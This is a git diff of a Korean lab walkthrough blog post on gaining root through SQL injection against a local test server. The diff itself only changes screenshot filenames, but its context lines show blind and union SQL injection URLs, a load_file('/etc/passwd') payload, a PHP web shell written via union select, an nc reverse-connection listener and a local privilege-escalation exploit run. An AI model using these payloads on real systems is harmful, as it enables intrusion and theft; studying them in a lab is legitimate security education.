@@ -41,7 +41,7 @@ VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
 
 # 2. SQL Injection 취약점 확인 (Blind SQL Injection, Union SQL Injection)
 
-<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/2.png"><br>
 <em>서비스 계정(id : test, pw : test)</em></p></center>
 
 로그인 이후, FREE BOARD, **USER BOARD(취약점 존재)**, Q&A BOARD, SERVICE BOARD 등 게시판에서 취약점이 있는지 여부를 확인한다.
@@ -54,10 +54,10 @@ VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
 위 둘의 URL 실행결과가 다른 것을 통해 SQL Injection 공격 취약점이 존재하는 것을 파악할 수 있다.
 </p>
 
-<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.1.png"><br>
 <em>[10.10.10.10/test/board.php?no=1 and 1=1 결과화면]</em></p></center>
 
-<center><p><img src="/assets/2019-01-28-post-web_sql/2.3.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.2.png"><br>
 <em>[10.10.10.10/test/board.php?no=1 and 1=0 결과화면]</em></p></center>
 
 ## Union SQL Injection
@@ -71,7 +71,7 @@ http://10.10.10.10/test/board.php?no=0 order by 8 -- 까지는 에러가 안뜬�
 http://10.10.10.10/test/board.php?no=0 order by 9 -- 부터 에러가 뜬다.  그러므로, 컬럼은 총 8개이다.
 </p>
 
-<center><p><img src="/assets/2019-01-28-post-web_sql/2.4.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.1.png"><br>
 <em></em></p></center>
 
 
@@ -80,7 +80,7 @@ http://10.10.10.10/test/board.php?no=0 order by 9 -- 부터 에러가 뜬다.  �
 http://10.10.10.10/test/board.php?no=0 union select 1,2,3,4,5,6,7,8 --
 </p>
 
-<center><p><img src="/assets/2019-01-28-post-web_sql/2.5.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.2.png"><br>
 <em></em></p></center>
 
 
@@ -89,7 +89,7 @@ http://10.10.10.10/test/board.php?no=0 union select 1,2,3,4,5,6,7,8 --
 http://10.10.10.10/test/board.php?no=0 union select 1, load_file('/etc/passwd'),3,4,5,6,7,8 --
 </p>
 
-<center><p><img src="/assets/2019-01-28-post-web_sql/2.6.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.3.png"><br>
 <em></em></p></center>
 
 
@@ -109,13 +109,13 @@ http://10.10.10.10/test/board.php?no=0 union select 1,"<?php system($_GET['cmd']
 <p>
 http://10.10.10.10/test/shell.php?cmd=ls
 </p>
-<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.png"><br>
+<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.1.png"><br>
 <em></em></p></center>
 
 <p>
 http://10.10.10.10/test/shell.php?cmd=ls  (nobody 권한인 것을 확인할 수 있다.)
 </p>
-<center><p><img src="/assets/2019-01-28-post-web_sql/3.3.png"></p></center>
+<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.2.png"></p></center>
 
 # 4. nc 를 이용한 reverse connection
 
@@ -124,7 +124,7 @@ http://10.10.10.10/test/shell.php?cmd=ls  (nobody 권한인 것을 확인할 수
 cmd 창 2개 생성
 - cmd_1 : nc -l -p 33333, nc 프로그램이 33333 번 포트로 응답대기(33333번 포트는 임의로 설정)
 - cmd_2 : netstat -na, 33333 포트가 응답대기인지 확인(프로그램이 제대로 실행되었는지 확인)
-<center><p><img src="/assets/2019-01-28-post-web_sql/4.1.png"></p></center>
+<center><p><img src="/assets/2019-01-28-post-web_sql/4.1.1.png"></p></center>
 
 > Web 에서 nc 실행하여, 공격 대상 서버 -> 공격자 PC 로 연결 (reverse connection)
 
@@ -162,13 +162,13 @@ cmd_1 : id (계정정보 확인)
 >  exploit code 컴파일 후 실행을 통한 권한상승
 
 ```1) gcc -o exp exp.c```
-<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.png"></p></center>
+<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.1.png"></p></center>
 
 ```2) ls -al```
-<center><p><img src="/assets/2019-01-28-post-web_sql/5.5.png"></p></center>
+<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.2.png"></p></center>
 
 ```3) ./exp  ,  id```
-<center><p><img src="/assets/2019-01-28-post-web_sql/5.6.png"></p></center>
+<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.3.png"></p></center>
 
 
 이상으로 SQL Injection 공격을 이용한 root 권한 획득에 대해 알아보았다.
